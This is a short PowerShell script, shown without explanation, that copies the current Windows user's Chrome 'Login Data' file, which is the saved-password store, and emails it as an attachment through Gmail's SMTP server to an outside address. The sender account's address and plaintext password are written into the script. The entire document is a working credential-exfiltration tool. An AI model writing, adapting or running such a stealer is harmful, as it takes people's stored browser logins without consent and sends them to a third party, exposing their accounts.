
$username=$env:UserName
$data="C:\Users\"+$username+"\AppData\Local\Google\Chrome\User Data\Default\Login Data"
copy-item -path $data -destination D:/
$From = "demosabin5010@gmail.com"
$Pass = "demoaccount"
$To = "sabinshrestha15@gmail.com"
$Attachment = "D:\Login Data"
$Subject = "Browser password"
$Body = "pass attached"
$SMTPServer = "smtp.gmail.com"
$SMTPPort = "587"
$credentials = new-object Management.Automation.PSCredential $From, ($Pass | ConvertTo-SecureString -AsPlainText -Force)
Send-MailMessage -From $From -to $To -Subject $Subject `
-Body $Body -SmtpServer $SMTPServer -port $SMTPPort -UseSsl `
-Credential $credentials -Attachments $Attachment
